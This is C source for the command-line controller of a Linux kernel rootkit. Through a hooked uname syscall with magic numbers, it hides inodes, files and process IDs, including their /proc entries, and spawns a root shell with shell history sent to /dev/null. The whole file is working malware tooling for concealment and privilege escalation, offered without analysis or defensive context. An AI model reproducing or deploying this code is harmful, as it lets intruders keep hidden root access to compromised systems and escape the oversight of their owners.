#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <getopt.h>
#include <unistd.h>
#include <sys/syscall.h>
#include <sys/stat.h>

#include <ylsm/ylsm_ctl.h>

#define warn(fmt, ...) fprintf(stderr, fmt"\n", ##__VA_ARGS__)

static inline void set_magics(struct rk_args *args)
{
	args->magic_number_1 = MAGIC_NUMBER_1;
	args->magic_number_2 = MAGIC_NUMBER_2;
}

static struct option long_options[] = {
	{"hide-inode", 1, 0, 0},
	{"unhide-inode", 1, 0, 1},
	{"lulz-mode", 1, 0, 2},
	{"root-shell", 0, 0, 3},
	{"hide-file", 1, 0, 4},
	{"unhide-file", 1, 0, 5},
	{"hide-pid", 1, 0, 6},
	{"unhide-pid", 1, 0, 7},
	{"debug-rk", 0, 0, 8},
	{"debug-stats", 0, 0, 9},
	{0, 0, 0, 0}
};

void usage(const char *path)
{
	printf("%s [options]\n" \
		"\t--hide-inode <inode>\thide inode\n"		\
		"\t--unhide-inode <inode>\tunhide inode\n"	\
		"\t--lulz-mode <on|off>\tactivate lulz mode\n"	\
		"\t--root-shell\t\tgive a root shell\n"		\
		"\t--hide-file <path>\thide file\n"		\
		"\t--unhide-file <path>\tunhide file\n"		\
		"\t--debug-rk\t\t(for debugging purpose)\n"	\
		"\t--debug-stats\t\t(for debugging purpose)\n"	\
		, path);
}

void root_shell(void)
{
	struct rk_args args;
	char *argv[] = { "/bin/sh", NULL };
	char *env[] = { "BASH_HISTORY=/dev/null", "HISTORY=/dev/null",
			"history=/dev/null" };

	set_magics(&args);
	args.mode = GET_ROOT;
	syscall(SYS_uname, &args);
	execve(argv[0], argv, env);
}

long get_inode(const char *path)
{
	struct stat st;

	if (stat(path, &st) < 0)
		return -1;

	return st.st_ino;
}

void hide_file(const char *path)
{
	long ino;
	struct rk_args args;

	ino = get_inode(path);
	if (ino < 0) {
		warn("unable to hide file %s", path);
		return;
	}

	set_magics(&args);
	args.mode = HIDE_INODE;
	args.param1 = ino;
	syscall(SYS_uname, &args);
}

void unhide_file(const char *path)
{
	long ino;
	struct rk_args args;

	ino = get_inode(path);
	if (ino < 0) {
		warn("unable to unhide file");
		return;
	}

	set_magics(&args);
	args.mode = UNHIDE_INODE;
	args.param1 = ino;
	syscall(SYS_uname, &args);
}

void hide_pid(pid_t pid)
{
	struct rk_args args;
	char proc_path[64];

	set_magics(&args);
	args.mode = HIDE_PID;
	args.param1 = atoi(optarg);
	syscall(SYS_uname, &args);

	snprintf(proc_path, sizeof(proc_path), "/proc/%d", pid);
	hide_file(proc_path);
	snprintf(proc_path, sizeof(proc_path), "/proc/%d/exe", pid);
	hide_file(proc_path);

}

void unhide_pid(pid_t pid)
{
	struct rk_args args;
	char proc_path[64];

	set_magics(&args);
	args.mode = UNHIDE_PID;
	args.param1 = atoi(optarg);
	syscall(SYS_uname, &args);

	snprintf(proc_path, sizeof(proc_path), "/proc/%d", pid);
	unhide_file(proc_path);
	snprintf(proc_path, sizeof(proc_path), "/proc/%d/exe", pid);
	unhide_file(proc_path);
}

int main(int argc, char **argv)
{
	int c, opt_idx;
	struct rk_args args;

	for (;;) {
		memset(&args, 0, sizeof(args));
		set_magics(&args);
		c = getopt_long(argc, argv, "h", long_options, &opt_idx);
		if (c == -1)
			break;

		switch (c) {
		case 'h':
			usage(argv[0]);
			return 0;
		case 0:
			args.mode = HIDE_INODE;
			args.param1 = atoi(optarg);
			syscall(SYS_uname, &args);
			break;
		case 1:
			args.mode = UNHIDE_INODE;
			args.param1 = atoi(optarg);
			syscall(SYS_uname, &args);
			break;
		case 2:
			args.mode = LULZ_MODE;
			if (!strcmp(optarg, "on")) {
				args.param1 = 1;
			} else if (!strcmp(optarg, "off")) {
				args.param1 = 0;
			} else {
				usage(argv[0]);
				return 1;
			}

			syscall(SYS_uname, &args);
			break;
		case 3:
			root_shell();
			break;
		case 4:
			hide_file(optarg);
			break;
		case 5:
			unhide_file(optarg);
			break;
		case 6:
			hide_pid(atoi(optarg));
			break;
		case 7:
			unhide_pid(atoi(optarg));
			break;
		case 8:
			args.mode = DEBUG_RK;
			syscall(SYS_uname, &args);
			break;
		case 9:
			args.mode = DEBUG_STATS;
			syscall(SYS_uname, &args);
			break;
		default:
			break;
		}
	}


	return 0;
}
